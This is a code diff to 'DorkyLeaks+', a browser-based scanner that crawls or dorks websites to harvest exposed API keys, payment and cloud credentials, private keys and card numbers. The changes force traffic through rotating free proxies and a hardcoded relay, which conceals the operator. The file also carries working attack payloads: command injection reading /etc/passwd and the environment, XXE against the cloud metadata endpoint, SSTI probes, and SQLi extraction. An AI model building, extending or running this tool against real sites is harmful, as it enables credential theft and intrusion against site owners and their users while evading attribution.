@@ -14,6 +14,8 @@ h1 span{color:var(--d)}
 .header-badges{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
 .hbadge{font-size:11px;font-weight:700;border:1px solid var(--b);background:var(--s);padding:3px 9px;border-radius:99px;color:var(--d)}
 .hbadge.warn{color:var(--warn);border-color:var(--warn)}
+.hbadge.ok{color:var(--ok);border-color:var(--ok)}
+.hbadge.bad{color:var(--bad);border-color:var(--bad)}
 .live{font-size:13px;font-weight:600;border:1px solid var(--b);background:var(--s);padding:6px 12px;border-radius:99px;display:flex;align-items:center;gap:7px}
 .live i{width:7px;height:7px;border-radius:50%;background:var(--d);display:block}
 .live.on i{background:var(--t);animation:p 1s infinite}
@@ -43,6 +45,7 @@ h1 span{color:var(--d)}
 .field textarea{font:12.5px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;min-height:100px;display:block;padding:0}
 .field-row{display:flex;gap:8px;align-items:center}
 .field-row input{flex:1}
+.field input[readonly]{color:var(--d);cursor:not-allowed}
 .badge{background:var(--s);border:1px solid var(--b);border-radius:12px;padding:10px 14px;margin-bottom:8px;font-size:12.5px;color:var(--d);line-height:1.5}
 .badge b{color:var(--t);font-weight:600}
 .hint{color:var(--d);font-size:12.5px;margin-bottom:14px;line-height:1.5}
@@ -62,7 +65,7 @@ h1 span{color:var(--d)}
 .card{display:flex;align-items:center;gap:12px;background:var(--s);border:1px solid var(--b);border-radius:var(--r);padding:12px 14px;cursor:pointer}
 .card .fl{font-size:22px;width:32px;text-align:center;flex:none}
 .card .mid{flex:1;min-width:0}
-.card .ad{font:600 13.5px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.card .ad{font:600 13px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .card .sub{color:var(--d);font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
 .card .rt{text-align:right;flex:none}
 .tag{display:inline-block;font-size:10.5px;font-weight:700;letter-spacing:.6px;text-transform:uppercase;border:1px solid #333;padding:2px 8px;border-radius:99px}
@@ -96,14 +99,15 @@ h1 span{color:var(--d)}
 .gh .c{color:var(--d);font-size:12px}
 .settings-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
 @media(max-width:560px){.settings-grid{grid-template-columns:1fr}}
-.proxy-row{display:flex;align-items:center;gap:8px;margin-bottom:6px}
+.proxy-row{display:flex;align-items:center;gap:8px;margin-bottom:6px;flex-wrap:wrap}
 .proxy-dot{width:9px;height:9px;border-radius:50%;background:var(--d);flex:none}
-.proxy-dot.checking{background:var(--warn)}
+.proxy-dot.checking{background:var(--warn);animation:p 1s infinite}
 .proxy-dot.ready{background:var(--ok)}
 .proxy-dot.none{background:var(--bad)}
 .proxy-badge{font-size:11px;font-weight:700;border:1px solid #333;padding:2px 9px;border-radius:99px;color:var(--d)}
 .proxy-badge.ready{color:var(--ok);border-color:var(--ok)}
 .proxy-badge.none{color:var(--bad);border-color:var(--bad)}
+.proxy-badge.checking{color:var(--warn);border-color:var(--warn)}
 .wisp-dot{width:9px;height:9px;border-radius:50%;background:var(--d);flex:none;display:inline-block}
 .wisp-dot.connected{background:var(--ok)}
 .wisp-dot.error{background:var(--bad)}
@@ -151,6 +155,8 @@ h1 span{color:var(--d)}
 .spin{display:inline-block;width:12px;height:12px;border:2px solid currentColor;border-right-color:transparent;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
 @keyframes sp{to{transform:rotate(360deg)}}
 hr.div{border:0;border-top:1px solid var(--b);margin:14px 0}
+.blocked-note{background:#1a0606;border:1px solid var(--bad);color:#fca5a5;border-radius:12px;padding:10px 14px;font-size:12.5px;margin-bottom:10px;display:none}
+.blocked-note.show{display:block}
 </style>
 <script src="https://cdn.jsdelivr.net/npm/fflate@0.8.2/umd/index.js"></script>
 </head>
@@ -160,10 +166,13 @@ hr.div{border:0;border-top:1px solid var(--b);margin:14px 0}
   <h1>DorkyLeaks<span>+</span></h1>
   <div class="header-badges">
     <span class="hbadge" id="moduleCountBadge">0 modules</span>
+    <span class="hbadge" id="proxyHeaderBadge">proxies: --</span>
     <span class="hbadge warn">Authorized use only</span>
   </div>
   <div class="live" id="live"><i></i><span id="liveTxt">idle</span></div>
 </header>
+
+<div class="blocked-note" id="blockedNote">Proxies are still loading / unavailable. Scans are blocked until at least one working proxy is validated. <button class="btn" id="retryProxyBtn" style="padding:6px 12px;font-size:12px;margin-top:8px">Retry proxy load</button></div>
 
 <div class="prog" id="prog">
   <div class="row"><span id="ptxt">Idle</span><span id="ppct">0%</span></div>
@@ -187,7 +196,7 @@ hr.div{border:0;border-top:1px solid var(--b);margin:14px 0}
 
 <section class="tab on" id="tab-crawl">
   <div class="field"><label>Target URL</label><input type="url" id="crawlUrl" placeholder="https://example.com" autocomplete="off" inputmode="url"></div>
-  <div class="badge"><b>Ultra-verbose pipeline.</b> Every request, response, redirect, cookie, payload, nonce, form field, gateway signature and scanner pass is printed live below.</div>
+  <div class="badge"><b>Ultra-verbose pipeline.</b> Every request, response, redirect, cookie, payload, nonce, form field, gateway signature and scanner pass is printed live below. Proxies are validated automatically on boot and rotated per request.</div>
   <div class="bar" style="margin-top:12px">
     <button class="btn pri" id="crawlGo">Start crawl</button>
     <button class="btn" id="crawlClear">Clear</button>
@@ -201,7 +210,7 @@ hr.div{border:0;border-top:1px solid var(--b);margin:14px 0}
 <section class="tab" id="tab-dork">
   <div class="field"><label>PublicWWW query</label><input type="text" id="dorkQ" placeholder='e.g. "sk_live_" filetype:env' autocomplete="off"></div>
   <div class="field"><label>Max URLs</label><input type="number" id="dorkMax" value="100" min="1" max="5000"></div>
-  <div class="badge">Same ultra-verbose pipeline per exported domain.</div>
+  <div class="badge">Same ultra-verbose pipeline per exported domain. Proxies are rotated between every domain.</div>
   <div class="bar" style="margin-top:12px">
     <button class="btn pri" id="dorkGo">Run dork</button>
     <button class="btn" id="dorkClear">Clear</button>
@@ -223,7 +232,7 @@ hr.div{border:0;border-top:1px solid var(--b);margin:14px 0}
 </section>
 
 <section class="tab" id="tab-modules">
-  <div class="badge"><b>Module scanner.</b> Individual security checks — WISP transport from Settings. Modules needing parameters auto-run the crawler first.</div>
+  <div class="badge"><b>Module scanner.</b> Individual security checks — WISP transport is hardcoded, proxies auto-load and rotate. Modules needing parameters auto-run the crawler first.</div>
   <div class="field"><label>Target URL</label><input type="url" id="moduleTargetUrl" placeholder="https://example.com" autocomplete="off" inputmode="url"></div>
   <div class="bar">
     <button class="btn pri" id="btnRunAll">Run All Modules</button>
@@ -250,14 +259,14 @@ hr.div{border:0;border-top:1px solid var(--b);margin:14px 0}
 </section>
 
 <section class="tab" id="tab-settings">
-  <div class="badge"><b>Connection settings</b> apply to all crawl, dork, and module scans.</div>
+  <div class="badge"><b>Connection settings</b> apply to all crawl, dork, and module scans. WISP endpoint is locked; proxies are loaded and validated automatically.</div>
   <div class="settings-grid">
     <div>
       <div class="field">
-        <label>WISP Server URL</label>
+        <label>WISP Server URL (locked)</label>
         <div class="field-row">
           <span class="wisp-dot" id="wispDot"></span>
-          <input type="text" id="wispUrl" placeholder="wss://wisp.mercurywork.shop/" autocomplete="off">
+          <input type="text" id="wispUrl" readonly>
         </div>
       </div>
       <div class="field"><label>Request Timeout (ms)</label><input type="number" id="reqTimeout" value="20000" min="1000" max="120000"></div>
@@ -267,18 +276,18 @@ hr.div{border:0;border-top:1px solid var(--b);margin:14px 0}
     </div>
     <div>
       <div class="field">
-        <label>Rotating Proxies</label>
+        <label>Rotating Proxies (auto)</label>
         <div class="proxy-row">
           <span class="proxy-dot" id="proxyDot"></span>
           <span class="proxy-badge" id="proxyBadge">not loaded</span>
           <label style="margin:0;display:flex;align-items:center;gap:5px;font-size:12px;cursor:pointer;margin-left:auto">
-            <input type="checkbox" id="proxyEnabled" disabled> Use proxies
+            <input type="checkbox" id="proxyEnabled" checked disabled> Use proxies
           </label>
         </div>
         <input type="text" id="proxyListUrl" value="https://thordata.github.io/awesome-free-proxy-list/data/links/http.txt" style="width:100%;background:none;border:0;color:var(--t);font:12px ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;outline:none;margin-top:6px" placeholder="Proxy list URL">
       </div>
       <div class="bar">
-        <button class="btn acc" id="btnLoadProxies">Load &amp; Validate Proxies</button>
+        <button class="btn acc" id="btnLoadProxies">Reload Proxies</button>
       </div>
     </div>
   </div>
@@ -394,8 +403,7 @@ const WORKER_SRC = document.getElementById('worker-src').textContent;
 /* ===== CONFIG ===== */
 const LIBCURL = 'https://cdn.jsdelivr.net/npm/libcurl.js@0.7/libcurl_full.js';
 const LIBCURL_M = LIBCURL.replace(/\.js$/, '.mjs');
-const WISP_PARAM = (new URLSearchParams(location.search).get('wisp') || '').split(',').map(x => x.trim()).filter(Boolean);
-const WISP_DEFAULT = ['wss://wisp.mercurywork.shop/'];
+const WISP_HARDCODED = 'wss://wisp.mercurywork.shop/';
 const PROBES = ['http://example.com/', 'http://httpbin.org/ip'];
 const WORKERS = 4, CRAWL_MAX = 200, CRAWL_CONC = 20, PROBE_CONC = 40, VULN_CONC = 20, MAX_FILE = 50 * 1024 * 1024;
 const USER_AGENTS = [
@@ -410,6 +418,25 @@ const getTimeout = () => parseInt(getSetting('reqTimeout', '20000'), 10) || 2000
 const getConc = () => Math.max(1, Math.min(40, parseInt(getSetting('concurrency', '10'), 10) || 10));
 const getUA = () => getSetting('userAgentInput', ua());
 const getExtraHdrs = () => { try { return JSON.parse(getSetting('extraHeaders', '{}') || '{}'); } catch { return {}; } };
+
+/* ===== EVIDENCE HELPERS ===== */
+function grabAround(text, needle, ctx) {
+  if (!needle) return '';
+  ctx = ctx || 40;
+  const s = String(text), n = String(needle);
+  const i = s.toLowerCase().indexOf(n.toLowerCase());
+  if (i < 0) return n.slice(0, 140);
+  return s.slice(Math.max(0, i - ctx), i + n.length + ctx).replace(/\s+/g, ' ').trim().slice(0, 160);
+}
+function captureEvidence(text, re, ctx) {
+  try {
+    const rx = new RegExp(re.source, re.flags.replace('g', ''));
+    const m = rx.exec(text); if (!m) return '';
+    const i = m.index || 0;
+    const c = ctx || 40;
+    return String(text).slice(Math.max(0, i - c), i + m[0].length + c).replace(/\s+/g, ' ').trim().slice(0, 160);
+  } catch { return ''; }
+}
 
 /* ===== WISP CLIENT ===== */
 const WISP_CONNECT = 0x01, WISP_DATA = 0x02, WISP_CLOSE = 0x04;
@@ -484,11 +511,20 @@ class WISPClient {
 }
 
 /* ===== PROXY ===== */
-let proxyList = [], proxyIndex = 0, proxyChecking = false, wispClient = null;
+let proxyList = [], proxyIndex = 0, proxyChecking = false, proxyReady = false, wispClient = null;
+const PROXY_STATS = { total: 0, alive: 0, dead: 0, lastError: '' };
+
 function setProxyStatus(cls, text) {
   const dot = document.getElementById('proxyDot'), badge = document.getElementById('proxyBadge');
   if (dot) dot.className = 'proxy-dot ' + cls;
   if (badge) { badge.className = 'proxy-badge ' + cls; badge.textContent = text; }
+  const hb = document.getElementById('proxyHeaderBadge');
+  if (hb) {
+    if (cls === 'ready') { hb.textContent = 'proxies: ' + PROXY_STATS.alive + ' alive'; hb.className = 'hbadge ok'; }
+    else if (cls === 'none') { hb.textContent = 'proxies: none'; hb.className = 'hbadge bad'; }
+    else if (cls === 'checking') { hb.textContent = 'proxies: validating'; hb.className = 'hbadge warn'; }
+    else { hb.textContent = 'proxies: --'; hb.className = 'hbadge'; }
+  }
 }
 function setWispDot(s) { const d = document.getElementById('wispDot'); if (d) d.className = 'wisp-dot ' + s; }
 
@@ -534,9 +570,11 @@ function buildProxyRequest(method, targetUrl, extraHeaders) {
   return [method + ' ' + targetUrl + ' HTTP/1.1', 'Host: ' + p.hostname, 'Connection: close', 'Proxy-Connection: close'].concat(Object.entries(extraHeaders).map(([k, v]) => k + ': ' + v), ['', '']).join('\r\n');
 }
 async function ensureWisp() {
-  const wispUrl = getSetting('wispUrl', '');
-  if (!wispUrl) throw new Error('No WISP server configured');
-  if (!wispClient || !wispClient.ready) { wispClient = new WISPClient(wispUrl); await wispClient.connect(); setWispDot('connected'); }
+  if (!wispClient || !wispClient.ready) {
+    wispClient = new WISPClient(WISP_HARDCODED);
+    await wispClient.connect();
+    setWispDot('connected');
+  }
   return wispClient;
 }
 async function checkOneProxy(proxyUrl, timeout) {
@@ -551,54 +589,65 @@ async function checkOneProxy(proxyUrl, timeout) {
 }
 async function loadAndCheckProxies(lines) {
   if (proxyChecking) return;
-  const wispUrl = getSetting('wispUrl', '');
-  if (!wispUrl) { toast('Set a WISP URL in Settings first'); return; }
-  proxyChecking = true;
+  proxyChecking = true; proxyReady = false;
   const btn = document.getElementById('btnLoadProxies'), chk = document.getElementById('proxyEnabled');
-  if (btn) btn.disabled = true; if (chk) chk.disabled = true;
-  proxyList = []; proxyIndex = 0;
-  setProxyStatus('checking', 'loading');
+  if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spin"></span>validating'; }
+  if (chk) chk.disabled = true;
+  proxyList = []; proxyIndex = 0; PROXY_STATS.total = 0; PROXY_STATS.alive = 0;
+  setProxyStatus('checking', 'loading list');
   try { await ensureWisp(); } catch (e) {
+    PROXY_STATS.lastError = e.message;
     setProxyStatus('none', 'WISP failed');
     tlog('moduleLog', 'x', '[Proxy] WISP failed: ' + e.message, 'bad');
-    if (btn) btn.disabled = false; proxyChecking = false; return;
+    if (btn) { btn.disabled = false; btn.textContent = 'Reload Proxies'; }
+    proxyChecking = false; updateScanButtons(); return;
   }
   let rawLines = lines;
   if (!rawLines) {
     const listUrl = getSetting('proxyListUrl', '');
     let raw = '';
     try { raw = await fetch(listUrl).then(r => r.text()); } catch {
+      PROXY_STATS.lastError = 'list fetch failed';
       setProxyStatus('none', 'list fetch failed');
-      if (btn) btn.disabled = false; proxyChecking = false; return;
+      if (btn) { btn.disabled = false; btn.textContent = 'Reload Proxies'; }
+      proxyChecking = false; updateScanButtons(); return;
     }
     rawLines = raw.split(/\r?\n/).map(l => l.trim()).filter(l => l.startsWith('http'));
   }
-  if (!rawLines.length) { setProxyStatus('none', 'empty list'); if (btn) btn.disabled = false; proxyChecking = false; return; }
+  if (!rawLines.length) {
+    setProxyStatus('none', 'empty list');
+    if (btn) { btn.disabled = false; btn.textContent = 'Reload Proxies'; }
+    proxyChecking = false; updateScanButtons(); return;
+  }
+  PROXY_STATS.total = rawLines.length;
   setProxyStatus('checking', 'validating 0/' + rawLines.length);
-  tlog('moduleLog', '.', '[Proxy] Validating ' + rawLines.length + ' proxies', 'proxy');
-  const PT = 8000, PC = 8;
-  let aliveCount = 0;
+  tlog('moduleLog', '.', '[Proxy] Validating ' + rawLines.length + ' proxies (concurrency 30, 6s timeout)', 'proxy');
+  const PT = 6000, PC = 30;
+  let aliveCount = 0, checked = 0;
   for (let i = 0; i < rawLines.length; i += PC) {
     const batch = rawLines.slice(i, i + PC);
     const results = await Promise.all(batch.map(async pUrl => {
-      try { const ip = await checkOneProxy(pUrl, PT); if (ip) tlog('moduleLog', '+', '[Proxy] ' + pUrl + ' -> ' + ip, 'hit'); return { url: pUrl, alive: !!ip, ip: ip || '' }; }
+      try { const ip = await checkOneProxy(pUrl, PT); return { url: pUrl, alive: !!ip, ip: ip || '' }; }
       catch { return { url: pUrl, alive: false, ip: '' }; }
     }));
-    for (const r of results) { proxyList.push(r); if (r.alive) aliveCount++; }
+    for (const r of results) { proxyList.push(r); if (r.alive) aliveCount++; checked++; }
     setProxyStatus('checking', 'checked ' + Math.min(i + PC, rawLines.length) + '/' + rawLines.length + ' (' + aliveCount + ' alive)');
   }
+  PROXY_STATS.alive = aliveCount; PROXY_STATS.dead = proxyList.length - aliveCount;
   const working = proxyList.filter(p => p.alive);
   if (working.length > 0) {
+    proxyReady = true;
     setProxyStatus('ready', working.length + ' ready');
-    tlog('moduleLog', '+', '[Proxy] ' + working.length + '/' + rawLines.length + ' verified', 'hit');
+    tlog('moduleLog', '+', '[Proxy] ' + working.length + '/' + rawLines.length + ' verified - rotation enabled', 'hit');
     if (chk) { chk.disabled = false; chk.checked = true; }
   } else {
     setProxyStatus('none', '0 alive');
-    tlog('moduleLog', '!', '[Proxy] No working proxies', 'warn');
+    tlog('moduleLog', '!', '[Proxy] No working proxies - scans blocked', 'warn');
     if (chk) chk.disabled = true;
   }
-  if (btn) btn.disabled = false;
+  if (btn) { btn.disabled = false; btn.textContent = 'Reload Proxies'; }
   proxyChecking = false;
+  updateScanButtons();
 }
 function nextProxy() {
   const working = proxyList.filter(p => p.alive);
@@ -607,6 +656,18 @@ function nextProxy() {
   proxyIndex = (proxyIndex + 1) % working.length;
   return p;
 }
+function markProxyDead(proxyUrl) {
+  const p = proxyList.find(x => x.url === proxyUrl);
+  if (p && p.alive) {
+    p.alive = false;
+    PROXY_STATS.alive = proxyList.filter(x => x.alive).length;
+    PROXY_STATS.dead++;
+    const still = PROXY_STATS.alive;
+    if (still > 0) setProxyStatus('ready', still + ' ready');
+    else { proxyReady = false; setProxyStatus('none', '0 alive'); updateScanButtons(); }
+  }
+}
+function autoLoadProxies() { return loadAndCheckProxies(); }
 
 /* ===== httpMod ===== */
 let modAbortController = new AbortController();
@@ -614,7 +675,7 @@ async function httpMod(url, extra = {}) {
   const timeout = getTimeout();
   const headers = Object.assign({ 'User-Agent': getUA() }, getExtraHdrs(), extra.headers || {});
   const method = extra.method || 'GET';
-  const useProxy = !!(document.getElementById('proxyEnabled') && document.getElementById('proxyEnabled').checked);
+  const useProxy = proxyReady && !!(document.getElementById('proxyEnabled') && document.getElementById('proxyEnabled').checked);
   if (useProxy) {
     const proxy = nextProxy();
     if (proxy) {
@@ -623,12 +684,12 @@ async function httpMod(url, extra = {}) {
         try {
           const pUrl = new URL(proxy.url);
           const req = buildProxyRequest(method, url, headers);
-          return await wispProxyRequest(wc, pUrl.hostname, pUrl.port ? parseInt(pUrl.port) : 80, req, timeout);
+          const r = await wispProxyRequest(wc, pUrl.hostname, pUrl.port ? parseInt(pUrl.port) : 80, req, timeout);
+          if (r.status > 0) return r;
+          markProxyDead(proxy.url);
         } catch (e) {
           if (e.name === 'AbortError') throw e;
-          proxy.alive = false;
-          const still = proxyList.filter(p => p.alive).length;
-          setProxyStatus(still > 0 ? 'ready' : 'none', still > 0 ? still + ' proxies ready' : '0 alive');
+          markProxyDead(proxy.url);
         }
       }
     }
@@ -642,15 +703,10 @@ async function httpMod(url, extra = {}) {
     return { status: resp.status, headers: hd, text, ok: resp.ok, redirected: resp.redirected, finalUrl: resp.url };
   } catch (e) {
     if (e.name === 'AbortError') throw e;
-    const wispUrl = getSetting('wispUrl', '');
-    if (wispUrl) {
-      if (!wispClient || !wispClient.ready) {
-        wispClient = new WISPClient(wispUrl);
-        try { await wispClient.connect(); setWispDot('connected'); } catch (we) { setWispDot('error'); throw new Error('WISP failed: ' + we.message); }
-      }
-      return await wispClient.request(method, url, headers, timeout);
+    if (!wispClient || !wispClient.ready) {
+      try { await ensureWisp(); } catch (we) { setWispDot('error'); throw new Error('WISP failed: ' + we.message); }
     }
-    throw e;
+    return await wispClient.request(method, url, headers, timeout);
   }
 }
 async function concurrentBatch(items, fn, conc) {
@@ -887,7 +943,14 @@ const XSS_TPL = [
 const CMDI = [';id','&&id','||id','|id','`id`','$(id)',';cat /etc/passwd','&&cat /etc/passwd',';sleep 5','&&sleep 5','||sleep 5','\nid\n','%0aid%0a',';ls -la','$(sleep 5)',';whoami','&&whoami','||whoami','|whoami','& whoami',';echo $PATH',';env'];
 const CMDI_SIGNS = [/uid=\d+\([^)]+\)/,/root:x:0:0/,/www-data/,/bin\/(?:sh|bash|dash)/,/drwxr-xr/,/total \d/,/\[boot loader\]/i,/Volume in drive/i,/NT AUTHORITY/i];
 function matchSign(text, sign) { return sign instanceof RegExp ? sign.test(text) : text.includes(sign); }
-const SSTI = [['{{7*7}}','49'],['${7*7}','49'],['<%= 7*7 %>','49'],['#{7*7}','49'],["{{7*'7'}}","7777777"],["${7*'7'}","7777777"],['{{config}}','SECRET_KEY']];
+const SSTI = [
+  ['{{1337*1337}}','1787569'],
+  ['${1337*1337}','1787569'],
+  ['<%= 1337*1337 %>','1787569'],
+  ['#{1337*1337}','1787569'],
+  ["{{7*'7'}}","7777777"],
+  ["${7*'7'}","7777777"]
+];
 const XXE_PAY_FILE = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;<\/root>';
 const XXE_PAY_OOB  = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]><root/>';
 const REDIR_PARAMS = ['redirect','redirect_to','redirecturl','redirect_uri','return','return_to','url','next','target','dest','destination','redir','go','continue','from','checkout_url','link','location','r','u','ref','forward','jump','callback'];
@@ -1730,23 +1793,19 @@ function spawnWorker(wisp) {
 }
 async function startPool() {
   pool.forEach(killWorker); pool = [];
-  let saved = '';
-  try { saved = localStorage.getItem('DL_wisp') || ''; } catch {}
-  const wl = [...new Set([...WISP_PARAM, saved, ...WISP_DEFAULT].filter(Boolean))];
   setLive('on', 'connecting');
-  tlog('crawlLog', 'o', 'booting workers - ' + wl.length + ' wisp candidates', 'dim');
-  tlog('dorkLog', 'o', 'booting workers - ' + wl.length + ' wisp candidates', 'dim');
-  const first = await spawnWorker(wl);
+  tlog('crawlLog', 'o', 'booting workers - hardcoded WISP ' + WISP_HARDCODED, 'dim');
+  tlog('dorkLog', 'o', 'booting workers - hardcoded WISP ' + WISP_HARDCODED, 'dim');
+  const first = await spawnWorker([WISP_HARDCODED]);
   if (!first.ok) {
     setLive('bad', 'wisp failed');
     tlog('crawlLog', 'x', 'wisp connect failed: ' + (first.why || '?'), 'bad');
     tlog('dorkLog', 'x', 'wisp connect failed: ' + (first.why || '?'), 'bad');
     return { ok: false, why: first.why || 'worker failed' };
   }
-  try { localStorage.setItem('DL_wisp', first.wisp); } catch {}
   tlog('crawlLog', '+', 'wisp ok: ' + first.wisp, 'hit');
   tlog('dorkLog', '+', 'wisp ok: ' + first.wisp, 'hit');
-  const rest = await Promise.all(Array.from({ length: WORKERS - 1 }, (_, k) => spawnWorker(rot(wl, k + 1))));
+  const rest = await Promise.all(Array.from({ length: WORKERS - 1 }, () => spawnWorker([WISP_HARDCODED])));
   rest.forEach((w, i) => { const ok = w && w.ok; tlog('crawlLog', ok ? '+' : 'x', 'worker ' + (i + 2) + '/' + WORKERS + ' ' + (ok ? 'ok' : (w && w.why || 'fail')), ok ? 'hit' : 'bad'); });
   const alive = pool.filter(w => w.ok && !w.dead).length;
   poolReady = alive > 0;
@@ -1780,6 +1839,18 @@ async function httpFetch(url, opts) {
   }
   return r;
 }
+
+/* ===== STATIC ASSET / CACHE-BUSTER FILTER ===== */
+const STATIC_EXT_RE = /\.(css|js|mjs|map|png|jpe?g|gif|svg|ico|webp|bmp|woff2?|ttf|eot|otf|mp4|webm|ogg|mp3|wav|flac|pdf|zip|gz|tgz|tar|7z|rar|exe|dmg|iso|apk|rss|atom)(\?|#|$)/i;
+const SKIP_PARAMS = new Set(['ver','v','version','_','t','ts','time','r','rand','random','cache','cb','_t','nonce']);
+const isStaticAsset = u => STATIC_EXT_RE.test(u);
+function isCacheBusterOnly(u) {
+  try {
+    const ks = [...new URL(u).searchParams.keys()];
+    return ks.length > 0 && ks.every(k => SKIP_PARAMS.has(k.toLowerCase()));
+  } catch { return false; }
+}
+const shouldSkipVuln = u => isStaticAsset(u) || isCacheBusterOnly(u);
 
 /* ===== STATE ===== */
 const state = { findings: [], seen: new Set(), downloads: [], files: [], gateways: new Set(), queue: [], queueId: 0 };
@@ -1880,6 +1951,16 @@ function detectGateways(content) {
   }
   return found;
 }
+// Expanded whitelist — everything except Email is allowed from HTML now.
+const KEEP_TYPES_HTML = [
+  'OpenAI','Anthropic','OpenRouter','Groq','Perplexity','Replicate','HuggingFace','xAI','Voyage','Fireworks','LangSmith',
+  'Stripe','PayPal','Braintree','Adyen','Square','Shopify','WooCommerce','Mollie','Razorpay','Plaid','Paddle',
+  'Slack','Google','AWS','Azure','GitHub','GitLab','NPM','PyPI','Doppler','Vault','DigitalOcean','Supabase','Firebase','Sentry','PostHog',
+  'Discord','Telegram','Mailgun','Mailchimp','SendGrid','Twilio','Mapbox',
+  'JWT','Bearer Token','Generic API Key','Generic Secret','SSH Priv Key','PGP Priv Key',
+  'PostgreSQL URI','MySQL URI','MongoDB URI','Redis URI',
+  'EVM Bare Key'
+];
 function scanAll(res, url, logId) {
   if (!res || !res.text) return { gateways: [] };
   const ct = res.headers['content-type'] || '';
@@ -1889,13 +1970,22 @@ function scanAll(res, url, logId) {
   const gws = detectGateways(res.text);
   const foundGatewayNames = [];
   for (const g of gws) {
-    if (g.startsWith('\x00')) { const parts = g.split('\x00'); const name = parts[1], val = parts[2]; if (addFinding(name, val, url, 'FORMAT_VALID')) tlog(L, '@', name + ' = ' + trunc(val, 80), 'gw'); }
-    else { state.gateways.add(g); if (addFinding('Gateway: ' + g, url, url, 'FORMAT_VALID')) tlog(L, '#', 'GATEWAY: ' + g, 'gw'); foundGatewayNames.push(g); }
+    if (g.startsWith('\x00')) {
+      const parts = g.split('\x00');
+      const name = parts[1], val = parts[2];
+      if (addFinding(name, val, url, 'FORMAT_VALID')) tlog(L, '@', name + ' = ' + trunc(val, 80), 'gw');
+    } else {
+      state.gateways.add(g);
+      const sig = GATEWAY_SIGNATURES[g] && GATEWAY_SIGNATURES[g].re;
+      const evidence = sig ? captureEvidence(res.text, sig) : g;
+      if (addFinding('Gateway: ' + g, evidence || g, url, 'FORMAT_VALID'))
+        tlog(L, '#', 'GATEWAY: ' + g + (evidence ? '  ::  ' + trunc(evidence, 100) : ''), 'gw');
+      foundGatewayNames.push(g);
+    }
   }
-  const keepTypes = ['OpenAI','Anthropic','Stripe','PayPal','Braintree','Adyen','Square','Shopify','Slack','Google','AWS','Azure','GitHub','GitLab','NPM','PyPI','Doppler','Vault','DigitalOcean','Supabase','Firebase','Sentry','PostHog','Discord','Telegram','Mailgun','Mailchimp','SendGrid','Twilio','Mapbox'];
   const secs = scanSecrets(res.text, url);
   for (const f of secs) {
-    if (isHtml && !keepTypes.some(t => f.type.startsWith(t))) continue;
+    if (isHtml && !KEEP_TYPES_HTML.some(t => f.type.startsWith(t))) continue;
     if (addFinding(f.type, f.value, url, 'FORMAT_VALID')) tlog(L, '*', f.type + ' = ' + trunc(f.value, 80), 'hit');
   }
   const cards = scanCards(res.text, url);
@@ -2050,6 +2140,7 @@ async function exportBundle() {
 
 /* ===== VULN SCANNER ===== */
 async function vulnScanUrl(url, logId) {
+  if (shouldSkipVuln(url)) return 0;
   let u; try { u = new URL(url); } catch { return 0; }
   const params = [...u.searchParams.keys()]; let count = 0;
   const marker = 'dky' + Math.random().toString(36).slice(2, 8);
@@ -2058,30 +2149,57 @@ async function vulnScanUrl(url, logId) {
   if (!params.length) { tlog(L, '.', 'no params - skipping', 'dim'); return 0; }
   for (const p of params) {
     if (abortFlag) break;
+    if (SKIP_PARAMS.has(p.toLowerCase())) continue;
     const orig = u.searchParams.get(p) || '';
     const mk = (name, val) => { const t = new URL(url); t.searchParams.set(name, val); return t; };
     tlog(L, '.', 'param "' + p + '" (orig="' + trunc(orig, 30) + '")', 'hdr');
-    for (const pay of SQLI_ERR_PAY) { if (abortFlag) break; try { const t = mk(p, orig + pay); tlog(L, '!', 'SQLi-err ?' + p + '=' + trunc(pay, 30), 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const low = (r.text || '').toLowerCase(); let hit = ''; for (const e of Object.entries(SQLI_ERR)) { const db = e[0], sigs = e[1]; if (sigs.some(s => low.includes(s))) { hit = db; break; } } if (hit) { tlog(L, 'X', 'SQLi(' + hit + ') CONFIRMED - ?' + p, 'vuln'); addFinding('SQLi (' + hit + ')', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
-    for (const pair of SQLI_BOOL) { if (abortFlag) break; try { const a = pair[0], b = pair[1]; const ta = mk(p, orig + ' ' + a), tb = mk(p, orig + ' ' + b); const [ra, rb] = await Promise.all([httpFetch(ta.href, { ms: 12000 }), httpFetch(tb.href, { ms: 12000 })]); const la = (ra.text || '').length, lb = (rb.text || '').length, delta = Math.abs(la - lb) / Math.max(la, lb); if (la > 100 && lb > 100 && delta > 0.25) { tlog(L, 'X', 'SQLi(bool) - delta ' + (delta * 100).toFixed(0) + '%', 'vuln'); addFinding('SQLi (boolean)', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
-    for (const test of SQLI_TIME) { if (abortFlag) break; try { const t = mk(p, test.pay); tlog(L, '!', 'SQLi-time(' + test.dbms + ') ?' + p, 'pay'); const t0 = performance.now(); await httpFetch(t.href, { ms: 12000 }); const dt = performance.now() - t0; if (dt > test.thresh) { tlog(L, 'X', 'SQLi(time/' + test.dbms + ') - ' + dt.toFixed(0) + 'ms', 'vuln'); addFinding('SQLi (time/' + test.dbms + ')', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
-    for (const pay of SQLI_EXTRACT) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'SQLi-extract ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const body = r.text || ''; if (/XPATH syntax error|~[0-9a-z._-]{5,}/i.test(body)) { tlog(L, 'X', 'SQLi(extract) CONFIRMED', 'vuln'); addFinding('SQLi (extract)', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
